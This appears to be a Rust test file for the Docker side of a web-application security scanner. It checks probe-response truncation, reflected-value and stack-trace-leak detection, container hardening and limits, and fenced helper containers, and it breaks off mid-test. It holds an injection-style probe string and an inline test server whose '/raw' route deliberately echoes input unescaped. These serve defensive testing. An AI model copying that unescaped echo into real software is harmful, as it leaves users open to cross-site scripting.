//! Tests of `docker.rs`: probing the running app and the containers around it: what the probe script sends and reads
//! back, how the helpers are fenced and hardened, the run's label and teardown, and the install step's words. Moved out
//! of `docker.rs` unchanged (backlog 0324).

use super::*;

#[test]
fn a_lost_sidecar_is_told_from_a_silent_app() {
    // ADR-025, Later, 8 October 2026: Docker's answer to an `exec` into a container that is
    // gone is written down once, with the first request that met it; a request that failed
    // some other way, or did not fail, writes nothing.
    let backend = DockerBackend::new();
    assert_eq!(backend.sidecar_lost(), None);
    assert!(!backend.note_if_sidecar_lost("probe-1", 0, "No such container: sv-1-probe"));
    assert!(!backend.note_if_sidecar_lost("probe-1", 1, "HTTP/1.1 500 Internal Server Error"));
    assert_eq!(
        backend.sidecar_lost(),
        None,
        "a crash is the app's, not the sidecar's"
    );
    assert!(backend.note_if_sidecar_lost(
        "probe-2",
        1,
        "Error response from daemon: No such container: sv-1-probe\n"
    ));
    let lost = backend.sidecar_lost().expect("written down");
    assert!(
        lost.contains("`probe-2`") && lost.contains("had stopped, or been removed"),
        "{lost}"
    );
    assert!(backend.note_if_sidecar_lost(
        "probe-3",
        1,
        "Error response from daemon: container sv-1-probe is not running\n"
    ));
    assert_eq!(
        backend.sidecar_lost().as_deref(),
        Some(lost.as_str()),
        "only the first"
    );
    assert_eq!(
        SIDECAR_SECONDS, 900,
        "the same life as before, now built from the budget"
    );
    assert_eq!(
        SIDECAR_SECONDS,
        SIDECAR_QUESTIONS_SECONDS + sv_check::signed_in::MOST_WAITING
    );
}

#[test]
fn a_stack_trace_below_the_cut_is_kept_and_found() {
    // H17: an error page whose trace starts below a long page of markup. Every marker is tried,
    // each past the cut, and each must survive the keeping and be found by the check itself.
    let missing = |body: String| sv_check::probes::ProbeResponse {
        id: "missing".to_owned(),
        status: 500,
        headers: Vec::new(),
        body,
    };
    // The answer to a body that does not parse (ADR-056): the error credit needs one.
    let bad_body = |body: String| sv_check::probes::ProbeResponse {
        id: "bad-body POST /".to_owned(),
        status: 500,
        headers: Vec::new(),
        body,
    };
    for marker in sv_check::probes::TRACE_MARKERS {
        let body = format!(
            "{}<pre>{marker} detail</pre>{}",
            "<div>layout</div>".repeat(600),
            "b".repeat(2_000)
        );
        assert!(
            body.find(marker).unwrap() > KEPT_CHARS,
            "the setup: {marker:?} is past the cut"
        );
        let kept = kept_body(&body);
        assert!(kept.contains(marker), "{marker:?} was cut away");
        for answer in [missing(kept.clone()), bad_body(kept.clone())] {
            let found = sv_check::probes::evaluate(std::slice::from_ref(&answer));
            assert!(
                found.iter().any(|f| f.rule_id == "probe.error-detail-leak"),
                "{marker:?} in {}: {found:?}",
                answer.id
            );
        }
        assert!(
            !sv_check::probes::verified(&[missing(kept.clone()), bad_body(kept)])
                .iter()
                .any(|v| v.check_id == "probe.error-detail-leak"),
            "{marker:?} was credited as saying nothing"
        );
    }
    // The control: the same long page with no trace keeps its start only, and an error answer
    // with it is credited.
    let plain = "<div>layout</div>".repeat(800);
    let kept = kept_body(&plain);
    assert_eq!(kept.chars().count(), KEPT_CHARS);
    assert!(
        sv_check::probes::verified(&[missing(kept.clone()), bad_body(kept)])
            .iter()
            .any(|v| v.check_id == "probe.error-detail-leak")
    );
}

#[test]
fn a_body_is_kept_to_its_start_and_the_value_when_it_comes_back_further_down() {
    let mark = sv_check::probes::REFLECTION_MARK;
    let short = "<p>hello</p>";
    assert_eq!(kept_body(short), short);
    // A long page with nothing of the probes' in it: its start, and nothing more.
    let long = "a".repeat(10_000);
    assert_eq!(kept_body(&long), "a".repeat(KEPT_CHARS));
    // The value far down the page comes back with the text around it, and only that.
    let far = format!(
        "{}<p>You searched for {mark}<\"'end</p>{}",
        "a".repeat(9_000),
        "b".repeat(9_000)
    );
    let kept = kept_body(&far);
    assert!(kept.starts_with(&"a".repeat(KEPT_CHARS)));
    assert!(
        kept.contains(&format!("{mark}<\"'end")),
        "the value and what follows it"
    );
    assert!(
        kept.chars().count() < KEPT_CHARS + 2 * AROUND_ECHO + mark.len() + 10,
        "{}",
        kept.len()
    );
    // Asked once and repeated six times: five places kept.
    let many = format!(
        "{}{}",
        "a".repeat(5_000),
        format!("{mark}<x {}", "c".repeat(500)).repeat(6)
    );
    assert_eq!(kept_body(&many).matches(mark).count(), MOST_ECHOES);
}

#[test]
fn an_echo_far_down_a_real_answer_reaches_the_judgment() {
    // From the bytes the app sends to the finding: an error page that repeats the path it was
    // asked for, after 6,000 characters of its own, the value cut short at the `<`.
    let mark = sv_check::probes::REFLECTION_MARK;
    let raw = format!(
        "HTTP/1.0 404 Not Found\r\nContent-Type: text/html; charset=utf-8\r\n\r\n<html>{}<p>No page at /x-{mark}<\"'</p></html>",
        "<p>filler</p>".repeat(460)
    );
    let answer = parse_response("reflect-missing", &raw).expect("an answer");
    assert!(
        raw.find(mark).unwrap() > KEPT_CHARS,
        "the setup: past the cut"
    );
    let findings = sv_check::probes::evaluate(&[answer]);
    assert!(
        findings
            .iter()
            .any(|f| f.rule_id == "probe.reflected-unencoded"),
        "{:?}",
        findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
    );
}

#[test]
fn a_value_across_the_cut_is_kept_whole_and_no_character_is_split() {
    let mark = sv_check::probes::REFLECTION_MARK;
    // Starts ten characters before the cut, ends after it.
    let body = format!(
        "{}{mark}<\"'tail{}",
        "a".repeat(KEPT_CHARS - 10),
        "z".repeat(1_000)
    );
    assert!(kept_body(&body).contains(&format!("{mark}<\"'tail")));
    // Two- and three-byte characters on every side of every boundary.
    let body = format!("{}{mark}<{}", "é".repeat(KEPT_CHARS + 77), "日".repeat(300));
    let kept = kept_body(&body);
    assert!(kept.contains(&format!("{mark}<")));
    let body = format!("{}{mark}{}", "日".repeat(KEPT_CHARS - 3), "é".repeat(300));
    assert!(kept_body(&body).contains(mark));
}

/// What `prepared` sends for `args`, as a fresh backend with no run under way sends it.
fn sent(args: &[&str]) -> Vec<String> {
    DockerBackend::new().prepared(args)
}

/// Asserts `args`, once through `prepared`, carry every hardening flag, and that the builder's
/// own arguments carry none of them: the one place is the only place.
fn hardened_by_prepared(args: &[&str]) {
    for flag in HARDENING {
        assert!(
            !args.contains(&flag),
            "{flag} written out beside `prepared`: {args:?}"
        );
    }
    let sent = sent(args);
    for flag in HARDENING {
        assert_eq!(
            sent.iter().filter(|a| *a == flag).count(),
            1,
            "{flag} once in what is sent: {sent:?}"
        );
    }
}

#[test]
fn every_container_started_is_hardened_in_one_place_and_a_plain_exec_is_not() {
    // The chokepoint: a `run` or a `create` of anything gets the five arguments, just after
    // the command word; an `exec` into a container that is already running gets none.
    for start in [
        &["run", "busybox"][..],
        &["create", "--name", "x", "busybox"][..],
    ] {
        hardened_by_prepared(start);
        let sent = sent(start);
        assert_eq!(sent[0], start[0]);
        // Before the image, beside the limits: nothing the caller wrote comes between.
        let image = sent.iter().position(|a| a == "busybox").unwrap();
        for flag in HARDENING {
            assert!(sent.iter().position(|a| a == flag).unwrap() < image);
        }
    }
    let exec = sent(&["exec", "-i", "sv-1-probe", "sh"]);
    for flag in HARDENING {
        assert!(!exec.iter().any(|a| a == flag), "{exec:?}");
    }
    // The install step's container, started through `docker` like every other, is hardened the
    // same way; its own arguments carry only what differs (no network fence, and a writable
    // volume).
    let install = crate::install::Install {
        ecosystem: crate::install::Ecosystem::Python,
        files: vec![],
        volume: "sv-deps-py-x".to_owned(),
    };
    let args = install.args("sv-1-install", "python:3.12-slim");
    let refs: Vec<&str> = args.iter().map(String::as_str).collect();
    hardened_by_prepared(&refs);
    // The stand-in name server (ADR-085) the same: its builder writes none of the five.
    let args = crate::name_server::start_args("sv-1-net", "sv-1-dns");
    let refs: Vec<&str> = args.iter().map(String::as_str).collect();
    hardened_by_prepared(&refs);
}

#[test]
fn a_crash_at_start_is_quoted_by_its_error_line() {
    // The loop's item 6, 6 October 2026: three Haiku apps crashed, and each was quoted as
    // "Traceback (most recent call last):", the first line, where Python says what went wrong
    // on its last.
    for (logs, line) in [
        (
            "Traceback (most recent call last):\n  File \"/app/app.py\", line 3, in <module>\n    port = os.environ['PORT_NUMBER']\n  File \"<frozen os>\", line 714, in __getitem__\nKeyError: 'PORT_NUMBER'\n",
            "KeyError: 'PORT_NUMBER'",
        ),
        (
            "node:internal/modules/cjs/loader:1148\n  throw err;\n  ^\n\nError: Cannot find module 'express'\nRequire stack:\n- /app/server.js\n    at Module._resolveFilename (node:internal/modules/cjs/loader:1145:15)\n\nNode.js v20.11.0\n",
            "Error: Cannot find module 'express'",
        ),
        (
            "starting\npanic: listen tcp :abc: invalid port\n\ngoroutine 1 [running]:\nmain.main()\n",
            "panic: listen tcp :abc: invalid port",
        ),
        (
            "/app/app.rb:3:in `<main>': undefined local variable or method `sinatra' for main:Object (NameError)\n",
            "/app/app.rb:3:in `<main>': undefined local variable or method `sinatra' for main:Object (NameError)",
        ),
        (
            "sqlite3.OperationalError: unable to open database file\n",
            "sqlite3.OperationalError: unable to open database file",
        ),
    ] {
        let (detail, crashed) = never_ready_detail(logs, None);
        assert!(crashed, "{logs}");
        assert_eq!(detail, format!("It stopped with an error: {line}"));
    }
    // An error's name is capitalized: a handler or a variable that happens to end in one is not.
    for logs in [
        "listening on 8080\nserver.onExit: handler registered\n",
        "listening on 8080\nwaiting for a signal (onExit)\n",
    ] {
        let (detail, crashed) = never_ready_detail(logs, None);
        assert!(!crashed, "{detail}");
    }
    // The control: an app still running, or waiting, is quoted by its last line, and is not
    // said to have crashed.
    let (detail, crashed) = never_ready_detail(
        " * Serving Flask app 'app'\n * Debug mode: off\nWARNING: This is a development server.\n * Running on http://127.0.0.1:5000\n",
        None,
    );
    assert!(!crashed);
    assert_eq!(
        detail,
        "Its last output was: * Running on http://127.0.0.1:5000"
    );
}

#[test]
fn an_app_with_a_build_step_is_told_why_the_step_cannot_install_here() {
    let pip = "Defaulting to user installation because normal site-packages is not writeable";
    let (with, _) = never_ready_detail(pip, Some("pip install -r requirements.txt"));
    assert!(
        with.starts_with(&format!("Its last output was: {pip}")),
        "{with}"
    );
    assert!(with.contains("`pip install -r requirements.txt`"), "{with}");
    assert!(
        with.contains("set `install = true` under `[stack.run]`")
            && with.contains("install them into the image"),
        "{with}"
    );
    // No build step, no sentence about one.
    let (without, _) = never_ready_detail("Listening on 8080", None);
    assert_eq!(without, "Its last output was: Listening on 8080");
}

#[test]
fn the_app_is_hardened_like_every_helper() {
    let mount = read_only_bind(std::path::Path::new("/apps/notes"), "/app");
    let args = app_args("sv-1-app", "sv-1-net", &mount, "PORT=8080");
    hardened_by_prepared(&args);
    let at = args.iter().position(|a| *a == "--network").unwrap();
    assert_eq!(args[at + 1], "sv-1-net");
    assert!(
        !args
            .iter()
            .any(|a| *a == "-p" || a.starts_with("--publish")),
        "nothing published: {args:?}"
    );
    let at = args.iter().position(|a| *a == "--mount").unwrap();
    assert_eq!(
        args[at + 1],
        "type=bind,src=/apps/notes,dst=/app,readonly",
        "the app's folder stays read-only: {args:?}"
    );
    // Its only writable places are in memory, and each has a size, so neither can be used to
    // fill the machine's memory.
    let tmpfs: Vec<&str> = args
        .windows(2)
        .filter(|w| w[0] == "--tmpfs")
        .map(|w| w[1])
        .collect();
    assert_eq!(tmpfs.len(), 2, "{tmpfs:?}");
    for mount in &tmpfs {
        assert!(mount.contains("size="), "{mount} has no size");
    }
    assert!(tmpfs.iter().any(|m| m.starts_with("/tmp:")), "{tmpfs:?}");
    assert!(
        tmpfs
            .iter()
            .any(|m| m.split(':').next() == Some(crate::REPORT_DIR)),
        "the report folder is where test runners are told to write: {tmpfs:?}"
    );
}

#[test]
fn every_container_is_started_with_limits_and_nothing_else_is_changed() {
    let backend = DockerBackend::new();
    backend.cpus.set(Some("2".to_owned())).unwrap();
    let value = |args: &[String], flag: &str| {
        let at = args.iter().position(|a| a == flag)?;
        args.get(at + 1).cloned()
    };
    // Every way a container is started here: the app, each helper, and the plain `run`s.
    let mut started: Vec<Vec<&str>> = vec![
        app_args(
            "sv-1-app",
            "sv-1-net",
            "type=bind,src=/apps/notes,dst=/app,readonly",
            "PORT=8080",
        ),
        browser_args("net", "b"),
        mail_args("net", "m"),
        driver_args("net", "JOB=1"),
        helper_args("net", "p", &["A=1", "B=2", "C=3", "D=4"], PROVIDER_SCRIPT),
        helper_args("net", "m", &["A=1", "B=2"], MODEL_SCRIPT),
        backend.fence_args(&Via::FreshContainer("net")),
        vec!["create", "busybox"],
    ];
    started[0].extend(["busybox", "sh"]);
    for args in &started {
        let sent = backend.prepared(args);
        assert_eq!(sent[0], args[0], "{sent:?}");
        assert_eq!(
            value(&sent, "--memory").as_deref(),
            Some(MEMORY_LIMIT),
            "{sent:?}"
        );
        assert_eq!(
            value(&sent, "--memory-swap").as_deref(),
            Some(MEMORY_LIMIT),
            "{sent:?}"
        );
        assert_eq!(
            value(&sent, "--pids-limit").as_deref(),
            Some(PROCESS_LIMIT),
            "{sent:?}"
        );
        assert_eq!(value(&sent, "--cpus").as_deref(), Some("2"), "{sent:?}");
        // Still labeled, and everything that was asked for is still there, in order.
        assert!(
            sent.iter()
                .any(|a| a.starts_with(crate::cleanup::OWNER_LABEL))
        );
        let asked: Vec<&String> = sent.iter().filter(|a| args.contains(&a.as_str())).collect();
        assert_eq!(asked.len(), args.len(), "{sent:?}");
        // Every in-memory folder has a size.
        for w in sent.windows(2).filter(|w| w[0] == "--tmpfs") {
            assert!(w[1].contains("size="), "{} has no size", w[1]);
        }
    }
    // A call that starts nothing is sent as it was, labels aside.
    for args in [
        vec!["exec", "-i", "sidecar", "wget", "-q"],
        vec!["rm", "-f", "app"],
        vec!["logs", "--tail", "20", "app"],
        vec!["network", "create", "--internal", "n"],
    ] {
        let sent = backend.prepared(&args);
        assert!(
            !sent.iter().any(|a| a == "--memory" || a == "--pids-limit"),
            "{sent:?}"
        );
    }
    // With no processor count from Docker, the other limits still hold.
    let sent = limited(vec!["run".to_owned(), "img".to_owned()], None);
    assert_eq!(
        sent,
        [
            "run",
            "--memory",
            MEMORY_LIMIT,
            "--memory-swap",
            MEMORY_LIMIT,
            "--pids-limit",
            PROCESS_LIMIT,
            "img"
        ]
    );
}

#[test]
fn two_runs_never_share_a_name() {
    // Two copies of `sv`, each process 7 in its own container, on one Docker daemon: the
    // names differ by their random part, so neither run's teardown can name the other's.
    let a = run_id(7, 0, &crate::random_hex(4));
    let b = run_id(7, 0, &crate::random_hex(4));
    assert!(
        a.starts_with("sv-7-0-") && b.starts_with("sv-7-0-"),
        "{a} {b}"
    );
    assert_ne!(a, b);
    assert_eq!(a.len(), "sv-7-0-".len() + 8, "{a}");
}

#[test]
fn everything_a_run_creates_carries_its_label_and_nothing_else_does() {
    let a = run_id(7, 0, "0badc0de");
    // While a run is under way, everything that creates a container or a network carries its
    // label; nothing else is changed, and with no run under way nothing carries one.
    let backend = DockerBackend::new();
    backend.cpus.set(None).unwrap();
    let label = |args: &[&str]| -> Option<String> {
        let sent = backend.prepared(args);
        sent.windows(2)
            .find(|w| w[0] == "--label" && w[1].starts_with(RUN_LABEL))
            .map(|w| w[1].clone())
    };
    assert_eq!(label(&["run", "-d", "busybox"]), None, "no run under way");
    *backend.run.lock().unwrap() = Some(a.clone());
    let mine = format!("{RUN_LABEL}={a}");
    for args in [
        &["run", "-d", "--name", "x", "busybox"][..],
        &["create", "busybox"][..],
        &["network", "create", "--internal", "n"][..],
    ] {
        assert_eq!(label(args).as_deref(), Some(mine.as_str()), "{args:?}");
    }
    for args in [
        &["exec", "-i", "x", "sh"][..],
        &["rm", "-f", "x"][..],
        &["logs", "x"][..],
    ] {
        assert_eq!(label(args), None, "{args:?}");
    }
    let sent = backend.prepared(&["network", "create", "--internal", "n"]);
    assert_eq!(sent.last().map(String::as_str), Some("n"), "{sent:?}");
}

#[test]
fn a_teardown_removes_what_docker_lists_under_its_label() {
    let a = run_id(7, 0, "0badc0de");
    // The teardown removes the ids Docker listed under the label, and only when it would not
    // list them falls back to the run's own names.
    let names = vec![format!("{a}-app"), format!("{a}-probe")];
    assert_eq!(
        to_remove(Some("abc123\n\ndef456\n"), &names),
        ["abc123", "def456"]
    );
    assert!(
        to_remove(Some(""), &names).is_empty(),
        "nothing of this run's is left"
    );
    assert_eq!(to_remove(None, &names), names);
}

#[test]
fn the_processor_limit_never_asks_for_more_than_docker_has() {
    assert_eq!(cpus_for("8\n").as_deref(), Some("2"));
    assert_eq!(cpus_for("2").as_deref(), Some("2"));
    assert_eq!(cpus_for("1").as_deref(), Some("1"));
    assert_eq!(cpus_for("0"), None);
    assert_eq!(cpus_for(""), None);
    assert_eq!(cpus_for("Cannot connect to the Docker daemon"), None);
}

#[test]
fn both_ways_of_reaching_the_app_are_fenced_the_same() {
    // The sidecar was hardened where it was written; the fallback three lines away was not, so
    // a run that could not start a sidecar made every request from a container with its
    // capabilities and a writable file system. The two paths are compared against each other
    // rather than each read on its own, because that is the shape the mistake had: correct in
    // one place and absent beside it.
    let backend = DockerBackend::new();
    let fresh = backend.fence_args(&Via::FreshContainer("net"));
    hardened_by_prepared(&fresh);
    assert!(
        fresh.contains(&"--network"),
        "and it still has to be on the fenced network: {fresh:?}"
    );
    // Measured against a real sidecar on 25 September 2026, with the host reaching 1.1.1.1:53
    // as the control: outbound blocked, DNS blocked, every path read-only, CapEff all zeroes.
}

#[test]
fn the_test_provider_is_fenced_and_hardened_like_the_sidecar() {
    let args = helper_args(
        "sv-1-net",
        "sv-1-idp",
        &["A=1", "B=2", "C=3", "D=4"],
        PROVIDER_SCRIPT,
    );
    hardened_by_prepared(&args);
    let at = args.iter().position(|a| *a == "--network").unwrap();
    assert_eq!(args[at + 1], "sv-1-net");
    assert!(
        !args
            .iter()
            .any(|a| *a == "-p" || a.starts_with("--publish")),
        "nothing published: {args:?}"
    );
    assert_eq!(
        args.last(),
        Some(&PROVIDER_SCRIPT),
        "the script is passed in, not read from the owner's disk"
    );
}

#[test]
fn the_switched_off_copy_differs_from_the_app_only_in_name_and_the_setting() {
    let first: Vec<String> = [
        "run",
        "-d",
        "--name",
        "sv-1-app",
        "--network",
        "sv-1-net",
        "-e",
        "PORT=8080",
        "python:3.12-slim",
        "sh",
        "-c",
        "cd /app && python app.py",
    ]
    .map(str::to_owned)
    .to_vec();
    let copy = switched_off_args(
        &first,
        "sv-1-app",
        "sv-1-app-off",
        "python:3.12-slim",
        "AI_DISABLED=1",
    )
    .unwrap();
    assert_eq!(
        copy,
        [
            "run",
            "-d",
            "--name",
            "sv-1-app-off",
            "--network",
            "sv-1-net",
            "-e",
            "PORT=8080",
            "-e",
            "AI_DISABLED=1",
            "python:3.12-slim",
            "sh",
            "-c",
            "cd /app && python app.py",
        ]
        .map(str::to_owned)
        .to_vec()
    );
    assert!(switched_off_args(&first, "sv-1-app", "x", "other-image", "A=1").is_none());
}

#[test]
fn the_test_model_is_fenced_and_hardened_like_the_sidecar() {
    let args = helper_args(
        "sv-1-net",
        "sv-1-model",
        &["HOST=sv-1-model", "PORT=9100"],
        MODEL_SCRIPT,
    );
    hardened_by_prepared(&args);
    let at = args.iter().position(|a| *a == "--network").unwrap();
    assert_eq!(args[at + 1], "sv-1-net");
    assert!(
        !args
            .iter()
            .any(|a| *a == "-p" || a.starts_with("--publish")),
        "nothing published: {args:?}"
    );
    assert_eq!(args.last(), Some(&MODEL_SCRIPT));
}

#[test]
fn the_app_is_given_the_test_model_and_no_key_that_works_anywhere_else() {
    let env = model_env(
        "sv-1-model",
        &["LLM_BASE_URL".to_owned()],
        Some("MCP_SERVER_URL"),
    );
    for expected in [
        "OPENAI_BASE_URL=http://sv-1-model:9100/v1",
        "ANTHROPIC_BASE_URL=http://sv-1-model:9100",
        "GOOGLE_GEMINI_BASE_URL=http://sv-1-model:9100",
        "LLM_BASE_URL=http://sv-1-model:9100/v1",
        "MCP_SERVER_URL=http://sv-1-model:9100/mcp",
    ] {
        assert!(env.iter().any(|e| e == expected), "{expected}: {env:?}");
    }
    for key in [
        "OPENAI_API_KEY",
        "ANTHROPIC_API_KEY",
        "GEMINI_API_KEY",
        "GOOGLE_API_KEY",
    ] {
        assert!(
            env.iter().any(|e| *e == format!("{key}={MODEL_KEY}")),
            "{key}: {env:?}"
        );
    }
}

#[test]
fn an_answer_a_node_server_takes_a_moment_over_still_arrives() {
    // The transport lost every answer a Node server was still working on: `echo | nc`
    // half-closed the connection and Node dropped it. This runs a server that waits 200ms
    // before replying and asks it through the same path the probes use. Where there is no
    // container backend it says so and stops, like the other tests that need one; where there
    // is one, a setup that fails is a failure, not a skip.
    let backend = DockerBackend::new();
    if backend.available().is_err() {
        println!("no container backend here; this needs one");
        return;
    }
    let network = format!("sv-slowtest-{}", std::process::id());
    let server = format!("{network}-app");
    let _ = backend.docker(&["network", "create", "--internal", &network]);
    let started = backend.docker(&[
            "run",
            "-d",
            "--rm",
            "--name",
            &server,
            "--network",
            &network,
            PROVIDER_IMAGE,
            "node",
            "-e",
            "require('http').createServer(async (q, s) => { await new Promise(r => setTimeout(r, 200)); s.end('late but here') }).listen(8080)",
        ]);
    let answer = matches!(started, Ok((0, _))).then(|| {
        std::thread::sleep(std::time::Duration::from_secs(2));
        let request = sv_check::probes::ProbeRequest {
            id: "slow".to_owned(),
            method: "GET".to_owned(),
            path: "/".to_owned(),
            headers: Vec::new(),
            body: None,
        };
        backend.probe(&Via::FreshContainer(&network), &server, 8080, &request)
    });
    let _ = backend.docker(&["rm", "-f", &server]);
    let _ = backend.docker(&["network", "rm", &network]);
    let answer = answer.unwrap_or_else(|| panic!("the test server did not start: {started:?}"));
    let answer = answer.expect("no answer: the reply was dropped while the server worked on it");
    assert_eq!(answer.status, 200);
    assert!(answer.body.contains("late but here"), "{}", answer.body);
}

/// A way to the app that counts how it was asked: each request alone, or several in one go.
struct Counting<'a> {
    inner: DockerHttp<'a>,
    alone: usize,
    in_one_go: usize,
}

impl sv_check::signed_in::Http for Counting<'_> {
    fn send(
        &mut self,
        request: &sv_check::probes::ProbeRequest,
    ) -> Option<sv_check::probes::ProbeResponse> {
        self.alone += 1;
        self.inner.send(request)
    }

    fn send_in_turn(
        &mut self,
        requests: &[sv_check::probes::ProbeRequest],
    ) -> Option<Vec<Option<sv_check::probes::ProbeResponse>>> {
        self.in_one_go += 1;
        self.inner.send_in_turn(requests)
    }
}

#[test]
fn requests_in_turn_reach_a_real_server_one_at_a_time_and_come_back_in_order() {
    // The anonymous questions in one call (`probe_in_turn`). The server takes a moment over
    // each answer and says how many it was answering at once; asked in turn, never more than
    // one. Where there is no container backend it says so and stops; where there is one, a
    // setup that fails is a failure.
    let backend = DockerBackend::new();
    if backend.available().is_err() {
        println!("no container backend here; this needs one");
        return;
    }
    let network = format!("sv-inturn-{}", std::process::id());
    let server = format!("{network}-app");
    let _ = backend.docker(&["network", "create", "--internal", &network]);
    let started = backend.docker(&[
            "run",
            "-d",
            "--rm",
            "--name",
            &server,
            "--network",
            &network,
            PROVIDER_IMAGE,
            "node",
            "-e",
            "let n = 0, now = 0, most = 0; require('http').createServer(async (q, s) => { n += 1; const mine = n; now += 1; most = Math.max(most, now); await new Promise(r => setTimeout(r, 300)); now -= 1; s.end(`${q.url} ${mine} ${most}`) }).listen(8080)",
        ]);
    let requests: Vec<sv_check::probes::ProbeRequest> = (1..=5)
        .map(|i| sv_check::probes::ProbeRequest {
            id: format!("q{i}"),
            method: "GET".to_owned(),
            path: format!("/q{i}"),
            headers: Vec::new(),
            body: None,
        })
        .collect();
    let answers = matches!(started, Ok((0, _))).then(|| {
        // Until the server answers, at most 20 seconds: a fixed two seconds was once too short
        // for it to start listening, and the first question then had no answer.
        let up = (0..20).any(|_| {
            let answered = backend
                .probe(&Via::FreshContainer(&network), &server, 8080, &requests[0])
                .is_some();
            if !answered {
                std::thread::sleep(std::time::Duration::from_secs(1));
            }
            answered
        });
        assert!(up, "the test server never answered");
        // Asked as a run asks them: through the way into the fence a run uses, counted.
        let via = Via::FreshContainer(&network);
        let mut http = Counting {
            inner: DockerHttp {
                backend: &backend,
                via: &via,
                app: &server,
                port: 8080,
                mail: None,
                provider: None,
                browser: None,
                model: None,
                on_step: None,
            },
            alone: 0,
            in_one_go: 0,
        };
        let (answers, left_out) = sv_check::signed_in::ask_anonymously(&mut http, &requests);
        (answers, left_out, http.alone, http.in_one_go)
    });
    let _ = backend.docker(&["rm", "-f", &server]);
    let _ = backend.docker(&["network", "rm", &network]);
    let (answers, left_out, alone, in_one_go) =
        answers.unwrap_or_else(|| panic!("the test server did not start: {started:?}"));
    assert_eq!((in_one_go, alone), (1, 0), "asked in one call, none alone");
    assert!(left_out.is_empty(), "{left_out:?}");
    assert_eq!(answers.len(), 5, "{answers:?}");
    for (i, answer) in answers.iter().enumerate() {
        assert_eq!(answer.id, format!("q{}", i + 1));
        assert_eq!(answer.status, 200, "{answer:?}");
        // Its own path, in the order sent, and never two at once.
        // The server counts from the question that found it up, so the first here is its second.
        assert_eq!(
            answer.body,
            format!("/q{} {} 1", i + 1, i + 2),
            "{answers:?}"
        );
    }
}

#[test]
fn requests_in_turn_wait_for_each_answer_and_keep_none_in_a_file() {
    let mark = at_once_mark();
    let script = in_turn_script("app", 8080, &[40, 50], &[1, 2], &mark);
    // One after another: nothing started in the background, and nothing to wait for after.
    assert!(!script.contains(" & "), "{script}");
    assert!(!script.contains("wait"), "{script}");
    assert!(script.contains("for p in 1:1 2:2; do"), "{script}");
    // The marker before each answer, and the answer straight to the output, not to a file in
    // the container's small memory folder.
    let each = &script[script.find("do ").unwrap()..script.find("done").unwrap()];
    assert!(
        each.find(&mark).unwrap() < each.find("nc -w 5 app 8080").unwrap(),
        "{each}"
    );
    assert!(each.trim_end().ends_with("2>&1;"), "{each}");
    assert!(!each.contains("> \"$d/$i\""), "{each}");
    // The input is cut as `at_once_script` cuts it.
    let (cut, _) = cut_and_pairs(&[40, 50], &[1, 2]);
    assert!(script.contains(&cut), "{script}");
}

#[test]
fn the_browser_and_its_driver_are_fenced_and_hardened_like_the_sidecar() {
    let browser = browser_args("sv-1-net", "sv-1-browser");
    let driver = driver_args("container:sv-1-browser", "SV_JOB=e30=");
    for args in [&browser, &driver] {
        hardened_by_prepared(args);
        assert!(
            !args
                .iter()
                .any(|a| *a == "-p" || a.starts_with("--publish") || *a == "-v"),
            "nothing published or mounted: {args:?}"
        );
    }
    let at = browser.iter().position(|a| *a == "--network").unwrap();
    assert_eq!(browser[at + 1], "sv-1-net");
    // DevTools on 127.0.0.1 alone, and Chromium started directly, not by the image's script,
    // which forwards it on every address (deep review S11).
    let at = browser.iter().position(|a| *a == "--entrypoint").unwrap();
    assert_eq!(browser[at + 1], "/headless-shell/headless-shell");
    assert_eq!(browser[at + 2], BROWSER_IMAGE);
    let after: Vec<&str> = browser[at + 3..].to_vec();
    assert!(
        after.contains(&"--remote-debugging-address=127.0.0.1"),
        "{after:?}"
    );
    assert!(after.contains(&"--remote-debugging-port=9223"), "{after:?}");
    assert!(!after.iter().any(|a| a.contains("0.0.0.0")), "{after:?}");
    // Every expression the driver runs goes through the world of its own, never the page's.
    let evaluations: Vec<&str> = DRIVER_SCRIPT
        .lines()
        .filter(|l| l.contains("Runtime.evaluate"))
        .collect();
    assert_eq!(evaluations.len(), 1, "{evaluations:?}");
    assert!(evaluations[0].contains("contextId"), "{evaluations:?}");
    // The driver has no network of its own: only the browser's, which is the fenced one.
    let at = driver.iter().position(|a| *a == "--network").unwrap();
    assert_eq!(driver[at + 1], "container:sv-1-browser");
    assert_eq!(driver.last(), Some(&DRIVER_SCRIPT));
    // One version of Chromium, named, so two runs draw pages the same way.
    let tag = BROWSER_IMAGE
        .split('@')
        .next()
        .unwrap()
        .rsplit(':')
        .next()
        .unwrap();
    assert!(
        tag.split('.').count() == 4 && tag.split('.').all(|p| p.parse::<u32>().is_ok()),
        "{BROWSER_IMAGE}"
    );
}

#[test]
fn the_browser_signs_in_with_the_cookies_it_is_given_and_runs_the_page() {
    // The driver, the forwarder, and the browser together, against a small app on a fenced
    // network: the cookie opens a private page, the page's own script runs, and a form typed
    // into is posted and shown. Needs a container backend; with one, a failed setup fails.
    let backend = DockerBackend::new();
    if backend.available().is_err() {
        println!("no container backend here; this needs one");
        return;
    }
    let network = format!("sv-browsertest-{}", std::process::id());
    let server = format!("{network}-app");
    let browser = format!("{network}-browser");
    let _ = backend.docker(&["network", "create", "--internal", &network]);
    let app = r#"
const http = require('http');
http.createServer((q, s) => {
  s.setHeader('content-type', 'text/html');
  const signed = (q.headers.cookie || '').includes('sid=abc');
  if (q.url === '/private' && !signed) { s.writeHead(302, { location: '/login' }); return s.end(); }
  if (q.url === '/private') return s.end('<title>x</title><p>mine</p><a id=bye href=/bye>bye</a><script>document.title = "ran"</script>');
  if (q.url === '/form') return s.end('<form method=post action=/echo><textarea name=t></textarea><button>Go</button></form>');
  if (q.url === '/echo') {
    let b = ''; q.on('data', (c) => (b += c));
    return q.on('end', () => s.end('<p>' + new URLSearchParams(b).get('t').replace(/</g, '&lt;') + '</p>'));
  }
  if (q.url === '/rawform') return s.end('<form method=post action=/raw><textarea name=t></textarea><button>Go</button></form>');
  if (q.url === '/raw') {
    let b = ''; q.on('data', (c) => (b += c));
    return q.on('end', () => s.end('<p>' + new URLSearchParams(b).get('t') + '</p>'));
  }
  s.end('<p>login</p>');
}).listen(8080);"#;
    let started = backend.docker(&[
        "run",
        "-d",
        "--rm",
        "--name",
        &server,
        "--network",
        &network,
        PROVIDER_IMAGE,
        "node",
        "-e",
        app,
    ]);
    let ready = matches!(started, Ok((0, _))) && backend.start_browser(&network, &browser) && {
        std::thread::sleep(std::time::Duration::from_secs(3));
        backend.forward_browser(&browser, &server, 8080)
    };
    let answers = ready.then(|| {
        let via = Via::FreshContainer(&network);
        let mut http = DockerHttp {
            backend: &backend,
            via: &via,
